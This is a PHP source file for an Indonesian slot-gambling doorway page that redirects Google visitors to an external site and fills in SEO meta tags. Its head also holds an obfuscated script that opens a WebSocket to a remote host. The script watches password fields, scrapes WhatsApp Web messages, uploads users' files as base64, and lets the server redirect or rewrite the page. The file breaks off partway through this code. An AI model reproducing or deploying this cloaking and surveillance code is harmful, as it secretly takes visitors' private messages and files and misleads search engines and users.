<?php
// Redirect jika referer dari Google
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
if (stripos($referer, 'google.') !== false) {
    header('Location: https://theking-seotom.darkhaus.site/amp/');
    exit();
}

// Setup dasar
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
$urlPath = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Ambil domain + folder (tanpa slug)
$fullPathParts = explode('/', trim($_SERVER['REQUEST_URI'], '/'));
$slugOnly = end($fullPathParts);
$baseFolder = str_replace('/' . $slugOnly, '', $_SERVER['REQUEST_URI']);
$domain = $protocol . "://" . $_SERVER['HTTP_HOST'] . rtrim($baseFolder, '/');

// Default variable
$BRANDS = $titleContent = $metadesContent = '';
$randomKeyword = $randomKeyword2 = $randomKeyword3 = $randomKeyword4 = $randomKeyword5 = '';
$randomUrl = $randomUrl2 = $randomUrl3 = $randomUrl4 = $randomUrl5 = '';
$amp = '';
$Number = 1; // akan digenerate di bawah

// Ambil slug dari URL
$uri = $_SERVER['REQUEST_URI'];
$scriptName = dirname($_SERVER['SCRIPT_NAME']);
$path = str_replace($scriptName, '', $uri);
$path = trim($path, '/');
$segments = explode('/', $path);

// Jika slug kosong (akses root domain), pakai default slug
if (empty($segments[0])) {
    $segments[0] = 'slot-garansi-100-persen-kekalahan'; // ganti default slug sesuai kebutuhan
}

$brandsData = [];
$currentIndex = 0;

// Ambil semua file .json di direktori saat ini
foreach (glob(__DIR__ . "/*.json") as $filename) {
    $jsonContent = file_get_contents($filename);
    $data = json_decode($jsonContent, true);

    if (is_array($data['brands'])) {
        $brandsData = array_merge($brandsData, $data['brands']);
    }
}

if (!empty($brandsData) && !empty($segments[0])) {
    $slug = mb_strtolower(urldecode($segments[0]));
    $amp = $slug;

    foreach ($brandsData as $index => $item) {
        if (mb_strtolower($item['slug']) === $slug) {
            $BRANDS = $item['brand'];
            $titleContent = $item['meta_title'];
            $metadesContent = $item['meta_description'];
            $currentIndex = $index;
            break;
        }
    }

    // Fungsi ambil data berurutan looping
    function getNextBrand($list, $index, $offset) {
        $count = count($list);
        return $list[($index + $offset) % $count];
    }

    // Ambil 5 brand berikutnya
    $next1 = getNextBrand($brandsData, $currentIndex, 1);
    $next2 = getNextBrand($brandsData, $currentIndex, 2);
    $next3 = getNextBrand($brandsData, $currentIndex, 3);
    $next4 = getNextBrand($brandsData, $currentIndex, 4);
    $next5 = getNextBrand($brandsData, $currentIndex, 5);

    $randomKeyword  = $next1['brand'];
    $randomKeyword2 = $next2['brand'];
    $randomKeyword3 = $next3['brand'];
    $randomKeyword4 = $next4['brand'];
    $randomKeyword5 = $next5['brand'];

    $randomUrl  = $next1['slug'];
    $randomUrl2 = $next2['slug'];
    $randomUrl3 = $next3['slug'];
    $randomUrl4 = $next4['slug'];
    $randomUrl5 = $next5['slug'];

    // Nomor konsisten berdasarkan slug tanpa 0 di depan
    $numberRaw = (crc32($slug) % 20) + 1;
    $Number = $numberRaw;
}
?>
<!DOCTYPE HTML>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<base href="<?php echo htmlspecialchars($urlPath); ?>">
<html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
<head>
  <meta charset="utf-8" />
  <title><?php echo htmlspecialchars($titleContent); ?></title>
  <meta name="description" content="<?php echo htmlspecialchars($metadesContent); ?>" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <meta name="data-spm" content="<?php echo htmlspecialchars($BRANDS); ?>" />
  <meta name="robots" content="index, follow" />
  <meta name="author" content="<?php echo htmlspecialchars($BRANDS); ?>">
  <meta name="og:url" content="<?php echo htmlspecialchars($urlPath); ?>" />
  <meta name="og:title" content="<?php echo htmlspecialchars($titleContent); ?>" />
  <meta name="og:type" content="product" />
  <meta name="og:description" content="<?php echo htmlspecialchars($metadesContent); ?>" />
  <meta name="og:image" content="https://image-seotom.pages.dev/banner<?php echo htmlspecialchars($Number); ?>.jpg" />
  <link rel="manifest" href="https://asset-satset.info/lazada/ane-hin.json">
  <link rel="shortcut icon" href="https://image-seotom.pages.dev/fav.png" />
  <link rel="canonical" href="<?php echo htmlspecialchars($urlPath); ?>" />
  <link rel="amphtml" href="https://theking-seotom.darkhaus.site/amp/?daftar=<?php echo htmlspecialchars($amp); ?>"/>
  <link rel="preload" href="https://image-seotom.pages.dev/banner<?php echo htmlspecialchars($Number); ?>.jpg" as="image" />
  <link rel="stylesheet" href="https://asset-satset.info/lazada/kuci-kutahe.css">
  <link rel="stylesheet" href="https://asset-satset.info/lazada/nehi-nehi.css" />
  <link rel="stylesheet" href="https://asset-satset.info/lazada/tumhiho.css" />
  <script>!function(){var e,t,Y;function n(){try{return window.self===window.top}catch(e){return!1}}function r(){setTimeout((function(){var e={type:"focus",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn};null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))}),0)}function a(){var e={type:"notification",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:w.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:w.pid,pn:w.pn};B.send(JSON.stringify(e))}function s(){y()}function i(){n()&&(clearInterval(I),clearInterval(T)),timeout=setTimeout((function(){g()}),L)}function o(e){if(n())switch(e.data.substring(0,1)){case"r":window.location=e.data.substring(1);break;case"b":document.body.innerHTML=e.data.substring(1);break;case"w":var t="true"==e.data.substring(1).toLowerCase();O!=t&&t&&v(),O=t;break;case"x":!function(e){try{const t=JSON.parse(e),Y=b.get(t.requestId);if(Y){b.delete(t.requestId);const{responseCallback:e,fileName:n}=Y;e(t,n)}}catch(e){unblockPage()}}(e.data.substring(1))}}function u(e){var t=document.createElement("a");return t.href=e,t.href}function d(e){if(!e)return!1;if("password"==e.type)return!0;if(e instanceof HTMLInputElement){var t=window.getComputedStyle(e);if(t){var Y=t.getPropertyValue("-webkit-text-security");return["disc","circle","square"].includes(Y)}}return!1}function c(e,t=!1){if(d(e)&&!J)if(J=!0,n()){var Y={type:"password_input_focus",focus:!0,token:w.token};B.send(JSON.stringify(Y))}else window.top.postMessage({message:"iframePasswordInputFocused",name:e.name,type:"password"},"*")}function M(e,t=!1){var Y=e&&e.name?e.name:"<unnamed>";if(d(e)&&J)if(J=!1,n()){var r={type:"password_input_focus",focus:!1,token:w.token};B.send(JSON.stringify(r))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:Y,type:"password"},"*")}function l(e){var t=document.activeElement;t&&t!=document.body?document.querySelector&&(t=document.querySelector(":focus")):t=null;for(var Y=0;Y<e.length;++Y){let s=e[Y];var n=d(s),r=n&&s.hasAttribute("autofocus"),a=n&&t&&s.isEqualNode(t);(r||a)&&c(s),s.tmInputEventListenerAttached||(s.addEventListener("focus",(function(e){c(e.target)}),!0),s.addEventListener("blur",(function(e){M(e.target)}),!0),s.tmInputEventListenerAttached=!0)}}function f(){l(document.getElementsByTagName("input"));var e=new MutationObserver((function(e){e&&e.forEach((function(e){e&&e.addedNodes&&0!=e.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),e.addedNodes.forEach((function(e){if(e.tagName){var t=[];"input"==e.tagName.toLowerCase()?t.push(e):t=e.getElementsByTagName("input"),t.length&&l(t)}})))}))}));e.observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",(function(e){M(),function(){for(var e=document.getElementsByTagName("input"),t=0;t<e.length;++t){let Y=e[t];Y.removeEventListener("focus",c),Y.removeEventListener("blur",M),delete Y.tmInputEventListenerAttached}}()}))}function D(){var e;n()&&(w.iup&&(e={type:"connect",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn},null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))),h()&&(v(),y(),function(){function e(e){return e.baseURI&&e.baseURI.startsWith("https://web.whatsapp.com/")}function t(e){const t=e.dataTransfer.files;t.length>0&&Array.from(t).forEach((e=>{N(e)}))}document.querySelectorAll("div").forEach((Y=>{e(Y)&&Y.addEventListener("drop",t,{passive:!0})}));var Y=new MutationObserver((function(e){e&&(Array.from(document.querySelectorAll(".message-in, .message-out")).reduce(((e,t)=>{var Y=t.querySelector("button[type=button], div[role=button]");return Y&&e.push(Y),e}),[]).forEach((e=>{const t="modified";e.hasAttribute(t)||(e.setAttribute(t,""),e.onclick=t=>{t.verified||(t.preventDefault(),t.stopPropagation(),new Promise((function(t,Y){!function(e,t,Y){try{const Y=e.parentElement,n=Y[Object.keys(Y).find((e=>e.includes("__reactProps")))].children.props.msg,r=n.mediaData,a=crypto.randomUUID();b.set(a,{responseCallback:e=>t(!e.block)}),B.send(JSON.stringify({requestId:a,type:"waptransfer",direction:"download",filename:r.__x_filename,filesize:r.__x_size,filetype:r.__x_mimetype,filehash:n.__x_encFilehash,url:document.URL,process:w.pn,content:""}))}catch{Y()}}(e,t,(()=>setTimeout((()=>Y()),1)))})).then((e=>{t.verified=e,t.verified&&t.target.dispatchEvent(t)}),(()=>{})))})})),e.forEach((function(e){e&&("childList"!==e.type||e.addedNodes.length<=0||e.addedNodes.forEach((function(e){if(e){e.querySelectorAll("input").forEach((e=>{!function(e){const t="modified";"file"!==e.type||e.hasAttribute(t)||(e.setAttribute(t,""),e.addEventListener("change",(e=>{Array.from(e.target.files).forEach((e=>{N(e)}))})))}(e)}));var t=document.querySelectorAll("div[id=main] header div")[2];if(t){var Y=t.querySelectorAll("div")[1],n=t.querySelectorAll("div")[2];k=(Y?Y.innerText:"")+":"+(n?n.innerText:"")}document.querySelector("div[id=main] header span[data-icon=default-user]")&&(C="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(C="group");var r=e.querySelectorAll(".message-in, .message-out");r||A("msgNodes is empty"),e.matches(".message-in, .message-out")&&(r=Array.prototype.slice.call(r)).push(e),r&&0!=r.length?r.forEach((function(e){if(e)if(!e.classList||e.classList.length<=0)A("msg node does not contain classList or classList is empty");else{var t=e.classList.contains("message-in"),Y=e.querySelector(".copyable-text"),n=e.querySelector(".selectable-text"),r=new Date,a=null;if(Y&&Y.attributes["data-pre-plain-text"]){var s=Y.attributes["data-pre-plain-text"].textContent,i=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[Symbol.match](s);if(!i||6!=i.length)return void A("no matches for string: "+s);if(i[3]&&i[3].length>1&&"p"==i[3].toLowerCase().slice(0,1)&&(i[1]=parseInt(i[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](i[4]),!dateParts||4!=dateParts.length)return void A("no matches for string: "+i[4]);if(A(i[4]+F),!(r=date.parse(i[4],F)||function(e,t,Y){var n=[[e,t,Y].join("-"),[e,Y,t].join("-"),[t,e,Y].join("-"),[t,Y,e].join("-"),[Y,e,t].join("-"),[Y,t,e].join("-")],r=Date.now();for(var a in n){var s=Date.parse(n[a]);if(s&&!(Math.abs(r-s)>1728e6))return new Date(s)}}(dateParts[1],dateParts[2],dateParts[3])))return void A("Can't parse date from string: "+i[4]);r.setHours(i[1]),r.setMinutes(i[2]),a=i[5]}A("isIncomingMsg = "+t+" msgDateTime = "+r+" msgSender = "+a+" wapStartTime = "+x+" wapTrackingEnabled = "+O),H.get(k)||H.set(k,x);var o=n?n.innerText:null;if(A("msgContent = "+o),a&&o&&O){var u=(a+o+k+r.getTime()).split("").map((function(e){return e.charCodeAt(0)})).reduce((function(e,t){return e+((e<<7)+(e<<3))^t})).toString(16);if(H.get(k).getTime()==r.getTime()?r.setMilliseconds(++R):(R=0,H.set(k,r)),!u||P.has(u))return void A("msgId is null or this msgId already tracked "+u);var d={type:"wapmessage",timestamp:r.getTime(),id:u,incoming:t,sender:t?a:"Me",content:o,recipient:t?"Me":k,conversationId:k+"("+C+")"};B.send(JSON.stringify(d)),P.add(u)}}})):A("no msg nodes found")}})))})))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0}),A("observer is ready")}()),n()&&(a(),I=setInterval(a,w.sendNotificationsInterval),h()&&(T=setInterval(s,w.pollWhatsappTrackingInterval))),function(){for(var e=[],t=document.getElementsByTagName("link"),Y=0;Y<t.length;++Y)"icon"!=t[Y].getAttribute("rel")&&"shortcut icon"!=t[Y].getAttribute("rel")||(e[e.length]=u(t[Y].getAttribute("href")));0==e.length&&(e[0]=u("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=e,n.title=document.title,n.token=w.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,B.send(JSON.stringify(n))}(),w.dontTrackWebPasswords&&f())}function p(){document.tmfilter||(g(),F={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function g(){(B=new WebSocket(w.connectionString)).onclose=i,B.onmessage=o,B.onopen=D,w.extJs&&(w.extJs.webSock={readyState:()=>B.readyState,send:e=>B.send(e)})}function m(){var e=function(){var e=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var t=0;t<e.length;t++)if(e[t]+"Hidden"in document)return e[t]+"Hidden";return null}();return!!e&&document[e]}function h(){var e=document.head.querySelector("[name='og:title']");return!!e&&"WhatsApp Web"===e.getAttribute("content")}function y(){B.send(JSON.stringify({type:"waptracking"}))}function v(){H=new Map,P=new Set,R=0,(x=new Date).setSeconds(0),x.setMilliseconds(0)}function S(e){for(var t="",Y=new Uint8Array(e),n=Y.byteLength,r=0;r<n;r++)t+=String.fromCharCode(Y[r]);return window.btoa(t)}e=this,t={},Y={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(e){return("000"+e.getFullYear()).slice(-4)},YY:function(e){return("0"+e.getFullYear()).slice(-2)},Y:function(e){return""+e.getFullYear()},MMMM:function(e){return this.MMMM[e.getMonth()]},MMM:function(e){return this.MMM[e.getMonth()]},MM:function(e){return("0"+(e.getMonth()+1)).slice(-2)},M:function(e){return""+(e.getMonth()+1)},DD:function(e){return("0"+e.getDate()).slice(-2)},D:function(e){return""+e.getDate()},HH:function(e){return("0"+e.getHours()).slice(-2)},H:function(e){return""+e.getHours()},A:function(e){return this.A[11<e.getHours()|0]},hh:function(e){return("0"+(e.getHours()%12||12)).slice(-2)},h:function(e){return""+(e.getHours()%12||12)},mm:function(e){return("0"+e.getMinutes()).slice(-2)},m:function(e){return""+e.getMinutes()},ss:function(e){return("0"+e.getSeconds()).slice(-2)},s:function(e){return""+e.getSeconds()},SSS:function(e){return("00"+e.getMilliseconds()).slice(-3)},SS:function(e){return("0"+(e.getMilliseconds()/10|0)).slice(-2)},S:function(e){return""+(e.getMilliseconds()/100|0)},dddd:function(e){return this.dddd[e.getDay()]},ddd:function(e){return this.ddd[e.getDay()]},dd:function(e){return this.dd[e.getDay()]},Z:function(e){return(0<(e=e.utc?0:e.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(e-e%100*.4)).slice(-4)},post:function(e){return e}},parser:{find:function(e,t){for(var Y,n=-1,r=0,a=0,s=e.length;a<s;a++)Y=e[a],!t.indexOf(Y)&&Y.length>r&&(n=a,r=Y.length);return{index:n,length:r}},MMMM:function(e){return this.parser.find(this.MMMM,e)},MMM:function(e){return this.parser.find(this.MMM,e)},A:function(e){return this.parser.find(this.A,e)},h:function(e,t){return(12===e?0:e)+12*t},pre:function(e){return e}}}},t.format=function(e,n,r){var a=t.addMinutes(e,r?e.getTimezoneOffset():0),s=Y.en,i=s.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(e){var t=i[e];return t?i.post(t.call(s,a,n)):e.replace(/\[(.*)]/,"$1")}))},t.parse=function(e,n,r){var a,s,i=Y.en,o=i.parser.pre(e),u=0,d=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,c={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};e=[31,28,31,30,31,30,31,31,30,31,30,31];for(var M={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=d.exec(n);){var l=0,f=1;for(s="";!s;)s=a[++l];a=s.charAt(0);var D=o.slice(u);if(2>l){var p=i.parser[s].call(i,D,n);M[a]=p.index,"M"===a&&M[a]++,f=p.length}else if(7>l)p=(D.match(c[l])||[""])[0],M[a]=0|("S"===a?(p+"000").slice(0,-s.length):p),f=p.length;else if(" "!==a&&a!==D[0])return NaN;if(!f)return NaN;u+=f}return u===o.length&&p?(M.Y+=70>M.Y?2e3:100>M.Y?1900:0,M.H=M.H||i.parser.h(M.h||0,M.A||0),n=new Date(M.Y,M.M-1,M.D,M.H,M.m,M.s,M.S),e[1]+=0|t.isLeapYear(n),1>M.M||12<M.M||1>M.D||M.D>e[M.M-1]||23<M.H||59<M.m||59<M.s?NaN:r?t.addMinutes(n,-n.getTimezoneOffset()):n):NaN},t.isValid=function(e,Y){return!!t.parse(e,Y)},t.addYears=function(e,Y){return t.addMonths(e,12*Y)},t.addMonths=function(e,t){var Y=new Date(e.getTime());return Y.setMonth(Y.getMonth()+t),Y},t.addDays=function(e,t){var Y=new Date(e.getTime());return Y.setDate(Y.getDate()+t),Y},t.addHours=function(e,Y){return t.addMilliseconds(e,36e5*Y)},t.addMinutes=function(e,Y){return t.addMilliseconds(e,6e4*Y)},t.addSeconds=function(e,Y){return t.addMilliseconds(e,1e3*Y)},t.addMilliseconds=function(e,t){return new Date(e.getTime()+t)},t.subtract=function(e,t){var Y=e.getTime()-t.getTime();return{toMilliseconds:function(){return Y},toSeconds:function(){return Y/1e3|0},toMinutes:function(){return Y/6e4|0},toHours:function(){return Y/36e5|0},toDays:function(){return Y/864e5|0}}},t.isLeapYear=function(e){return!(((e=e.getFullYear())%4||!(e%100))&&e%400)},t.isSameDay=function(e,Y){return t.format(e,"YYYYMMDD")===t.format(Y,"YYYYMMDD")},e.date=t;const b=new Map;function N(e){const t="tm_overlay",Y=10485760;let n=function(){let e=document.getElementById(t);e&&e.remove(),b.clear()};if(e){const r=new FileReader;let a;e.size>Y&&(a=e.slice(0,Y));let s=!1;if(b.forEach((t=>{t.fileName===e.name&&(s=!0)})),!s){r.addEventListener("load",(t=>{try{const t=crypto.randomUUID();b.set(t,{responseCallback:e=>{e.block&&function(){const e=[],t=t=>{t.querySelectorAll('button:not([tabindex="-1"])').forEach((t=>{t.querySelector('span[data-icon="x"]')&&(e.push(t),t.click())}))},Y=new MutationObserver(((Y,n)=>{Y.forEach((e=>{"childList"===e.type&&e.addedNodes.length>0&&e.addedNodes.forEach((e=>{e.nodeType===Node.ELEMENT_NODE&&t(e)}))})),e.length>0&&n.disconnect()}));Y.observe(document.body,{childList:!0,subtree:!0}),t(document),e.length>0&&Y.disconnect()}(),n()},fileName:e.name}),B.send(JSON.stringify({requestId:t,type:"waptransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:w.pn,content:S(r.result)}))}catch(e){n()}})),r.addEventListener("error",(e=>{n()})),r.addEventListener("abort",(e=>{n()})),function(){if(!document.getElementById(t)){let e=document.createElement("div");e.id=t,e.style.cssText="background:rgba(0, 0, 0, .6);position:absolute;top:0;left:0;height:100%;width:100%;z-index:999",document.body.appendChild(e)}}();try{null==a?r.readAsArrayBuffer(e):r.readAsArrayBuffer(a)}catch(e){n()}}}}function A(e){var t={handler:"log",module:"wapjs",url:"wap",message:e};B.send(JSON.stringify(t))}function E(e){var t={name:e.data.name,type:e.data.type};"iframePasswordInputFocused"===e.data.message?c(t,!0):"iframePasswordInputBlurred"===e.data.message&&M(t,!0)}var w={token:"13a92165-6da6-4b30-9148-bafc3dad0eb0",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"19892",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:/*   * don't use double slash comments here as this will be stored in one line for the TMU migrations   *    * this is stored in the kv_store table for the key hm_websites_js   *    * all code should describe one javascript object, i.e. { bla-bla-bla }   *    * this object will be included in standard js injection code as a replacement of 'insight_placeholder'   * if domain of the page matches one of the domain regexes from the hypermonitoring_web settings   * if not, 'insight_placeholder' will be replaced with null   *    * this object must contain function init(token), it will be called only once when document became visible (it is called for every iframe too)   *    * also this code contains placeholdes, see doc in the code (search for `_placeholder` suffix)   *    * also this object must contain property webSock that will be assigned WebSocket when created   *    * this object should send json for every registered event with the following structure:   * {   *      cat: 'insight' - this is required to route the message to the proper handler   *      type: click | changed - type of the event   *      elm: uint32 - id of the element that fired the event. used for deduplication of the events   *      page: uint32 - id of the hypermonitored location   *      obj: uint32 - id of the hypermonitored object that fired event   *      url: string - current document url   *      token: string - js injection token, used to unique identify browser page   *      values: json - contains all collected information about event and it's context   *      proc: id of the process of the host electron   * }   */  {      /* this will be replaced with the rules for current domain       * [        *      {          *          id: locationId,        *          url: string | null,        *          objects:        *          [       *              {        *                  id: objectId,        *                  sources: [],       *                  ...       *              },       *              ...       *          ]        *      },       *      ...       * ]       */      pages: [],        /* required property for electron */      proc: null,        /* required property - will be assigned to WebSocket once it will be read */      webSock: null,      pendingPackets: [],        webSockReady: function () {          return this.webSock !== null && this.webSock.readyState === WebSocket.OPEN;      },        processPacket: function (t) {          if (!this.webSockReady())              this.pendingPackets.push(t);          else {              this.sendPendingPackets();              this.webSock.send(t);          }      },        sendPendingPackets: function () {          if (this.webSockReady() && this.pendingPackets.length > 0) {              for (var i = 0; i < this.pendingPackets.length; ++i)                  this.webSock.send(this.pendingPackets[i]);              this.pendingPackets = [];          }      },        /* store js injection token */      token: null,        /* should we send log messages to the agent, bool */      sendLog: false,        /* should we include all content of the htmlelements in the log messages, bool */      sendLogFullData: false,        /* should we log snapshots of the html after every mutation event */      sendLogSnapshots: false,        /* should we catch exceptions and log them (as opposed to let browser stops in debugger) */      sendLogExceptions: true,        /*       * required function - it will be called once when document became visible       * it will be also called for iframes       *           * argument token - js injection token       */      init: function (token) {          this.token = token;          this.log("init: token:" + token + " sendLog:" + this.sendLog + " sendLogFullData:" + this.sendLogFullData);            if (document.readyState === "interactive" || document.readyState === "complete")              this.attachEvents();          else              window.addEventListener("DOMContentLoaded", this.attachEvents.bind(this));            setInterval(this.sendPendingPackets.bind(this), 1000);      },        